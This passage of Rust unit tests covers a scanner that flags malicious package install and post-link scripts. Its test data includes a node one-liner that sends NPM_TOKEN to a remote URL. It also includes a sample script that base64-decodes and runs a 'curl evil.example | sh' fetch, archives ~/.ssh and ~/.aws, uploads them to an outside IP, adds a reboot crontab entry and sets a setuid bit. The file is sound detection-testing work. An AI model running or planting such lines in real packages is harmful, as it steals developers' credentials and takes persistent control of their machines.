        let big_body = format!("sh -c '{}'", "echo x; ".repeat(100_000));
        let _ = analyze_script(&sh(&big_body));
        let wide = format!("{}\n", "node -e \"eval(p)\"; ".repeat(1_000));
        let f = analyze_script(&sh(&wide));
        assert_eq!(rules(&f), vec!["remote-code-execution"]);
    }

    #[test]
    fn root_privileged_hooks_promote_medium_findings() {
        let body = "node -e \"require('https').get(u + process.env.NPM_TOKEN)\"\n";
        let user = make_inline_script(ScriptKind::PreInstall, "package.json#x", body);
        let root = make_inline_script(ScriptKind::RpmPost, "foo.spec#%post", body);
        assert!(ScriptKind::RpmPost.runs_as_root());
        assert!(!ScriptKind::PreInstall.runs_as_root());
        assert_rule(
            &analyze_script(&user),
            "credential-access",
            ScriptSeverity::Medium,
        );
        assert_rule(
            &analyze_script(&root),
            "credential-access",
            ScriptSeverity::High,
        );
        // Same rules fire either way; only the weighting differs.
        assert_eq!(rules(&analyze_script(&user)), rules(&analyze_script(&root)));
    }

    #[test]
    fn realistic_malicious_script_end_to_end() {
        let body = "#!/bin/bash\n\
            # totally legit post-link\n\
            mkdir -p \"$PREFIX/etc/conda/activate.d\"\n\
            P=$(echo Y3VybCBodHRwOi8vZXZpbC5leGFtcGxlL3guc2ggfCBzaA== | base64 -d)\n\
            eval \"$P\"\n\
            tar czf /tmp/.k.tgz ~/.ssh ~/.aws 2>/dev/null\n\
            curl -s -T /tmp/.k.tgz http://203.0.113.9:8080/up\n\
            echo '@reboot $PREFIX/bin/.agent' | crontab -\n\
            chmod +s \"$PREFIX/bin/.agent\"\n";
        let f = analyze_script(&sh(body));
        let ids: Vec<(u32, &str)> = f.iter().map(|x| (x.line, x.rule.as_str())).collect();
        assert!(ids.contains(&(4, "obfuscation")), "{ids:?}");
        assert!(ids.contains(&(5, "obfuscation")), "{ids:?}");
        assert!(ids.contains(&(6, "credential-access")), "{ids:?}");
        assert!(ids.contains(&(7, "network-egress")), "{ids:?}");
        assert!(ids.contains(&(8, "persistence")), "{ids:?}");
        assert!(ids.contains(&(9, "privilege-change")), "{ids:?}");
        assert!(!ids.iter().any(|(l, _)| *l == 3), "{ids:?}");
        assert!(f
            .iter()
            .all(|x| !x.explanation.is_empty() && !x.excerpt.is_empty()));
    }
}
